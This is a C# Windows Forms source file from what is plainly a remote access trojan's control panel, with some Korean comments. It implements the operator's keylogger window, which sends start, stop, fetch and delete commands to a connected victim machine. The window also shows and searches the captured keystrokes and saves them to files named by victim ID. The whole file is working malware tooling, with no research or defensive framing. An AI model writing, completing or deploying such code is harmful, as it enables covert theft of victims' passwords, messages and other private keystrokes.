using System;
using System.Drawing;
using System.Windows.Forms;
using System.Threading.Tasks;
using Newtonsoft.Json;
using RAT.Shared.Models;

namespace RAT.ControlPanel.Forms
{
    public partial class frmKeyLogger : Form
    {
        private ClientInfo client;
        private MainForm mainForm;
        private bool isLogging = false;
        
        public frmKeyLogger(ClientInfo client, MainForm mainForm)
        {
            this.client = client;
            this.mainForm = mainForm;
            InitializeComponent();
            this.Text = $"KeyLogger - {client.ClientId}";
            
            // MainForm에 이 폼 등록
            mainForm.RegisterForm(client.ClientId, this);
        }
        
        private void frmKeyLogger_Load(object sender, EventArgs e)
        {
            // 초기 로그 가져오기
            _ = LoadLogs();
        }
        
        // ===== Start/Stop Logging =====
        
        private async void btnStart_Click(object sender, EventArgs e)
        {
            if (!isLogging)
            {
                await SendCommand(new { type = "keylogger_start" });
                isLogging = true;
                btnStart.Text = "Stop";
                btnStart.BackColor = Color.Red;
                timerRefresh.Start();
            }
            else
            {
                await SendCommand(new { type = "keylogger_stop" });
                isLogging = false;
                btnStart.Text = "Start";
                btnStart.BackColor = SystemColors.Control;
                timerRefresh.Stop();
            }
        }
        
        // ===== Refresh Logs =====
        
        private async void btnRefresh_Click(object sender, EventArgs e)
        {
            await LoadLogs();
        }
        
        private async Task LoadLogs()
        {
            await SendCommand(new { type = "keylogger_get" });
        }
        
        // ===== Clear Logs =====
        
        private async void btnClear_Click(object sender, EventArgs e)
        {
            if (MessageBox.Show("Clear all logs?", "Confirm", MessageBoxButtons.YesNo, MessageBoxIcon.Question) == DialogResult.Yes)
            {
                await SendCommand(new { type = "keylogger_delete" });
                richTextBox1.Clear();
            }
        }
        
        // ===== New Log =====
        
        private async void btnNew_Click(object sender, EventArgs e)
        {
            await SendCommand(new { type = "keylogger_new" });
            richTextBox1.Clear();
        }
        
        // ===== Save Logs =====
        
        private void btnSave_Click(object sender, EventArgs e)
        {
            if (string.IsNullOrEmpty(richTextBox1.Text))
            {
                MessageBox.Show("No logs to save", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                return;
            }
            
            SaveFileDialog sfd = new SaveFileDialog();
            sfd.Filter = "Text File|*.txt|RTF File|*.rtf|All Files|*.*";
            sfd.FileName = $"keylog_{client.ClientId}_{DateTime.Now:yyyyMMdd_HHmmss}";
            
            if (sfd.ShowDialog() == DialogResult.OK)
            {
                if (sfd.FileName.EndsWith(".rtf"))
                {
                    richTextBox1.SaveFile(sfd.FileName);
                }
                else
                {
                    System.IO.File.WriteAllText(sfd.FileName, richTextBox1.Text);
                }
                
                MessageBox.Show("Logs saved successfully", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
        }
        
        // ===== Auto Refresh Timer =====
        
        private async void timerRefresh_Tick(object sender, EventArgs e)
        {
            if (isLogging)
            {
                await LoadLogs();
            }
        }
        
        // ===== Search =====
        
        private void btnSearch_Click(object sender, EventArgs e)
        {
            string searchText = txtSearch.Text;
            if (string.IsNullOrEmpty(searchText))
            {
                MessageBox.Show("Enter search text", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                return;
            }
            
            int index = richTextBox1.Find(searchText, richTextBox1.SelectionStart + richTextBox1.SelectionLength, RichTextBoxFinds.None);
            
            if (index >= 0)
            {
                richTextBox1.Select(index, searchText.Length);
                richTextBox1.ScrollToCaret();
            }
            else
            {
                MessageBox.Show("Text not found", "Search", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
        }
        
        // ===== 명령 전송 =====
        
        private async Task SendCommand(object command)
        {
            await mainForm.SendCommand(client, command);
        }
        
        // ===== 응답 처리 =====
        
        public void HandleResponse(dynamic response)
        {
            if (InvokeRequired)
            {
                Invoke(new Action(() => HandleResponse(response)));
                return;
            }
            
            string type = response.type.ToString();
            
            if (type == "keylogger_get")
            {
                string logs = response.data.ToString();
                richTextBox1.Text = logs;
                richTextBox1.SelectionStart = richTextBox1.Text.Length;
                richTextBox1.ScrollToCaret();
                
                lblStatus.Text = $"Last Update: {DateTime.Now:HH:mm:ss} | Lines: {richTextBox1.Lines.Length}";
            }
            else if (type == "keylogger_start")
            {
                lblStatus.Text = "Logging started";
            }
            else if (type == "keylogger_stop")
            {
                lblStatus.Text = "Logging stopped";
            }
        }
        
        private void frmKeyLogger_FormClosing(object sender, FormClosingEventArgs e)
        {
            timerRefresh.Stop();
        }
    }
}
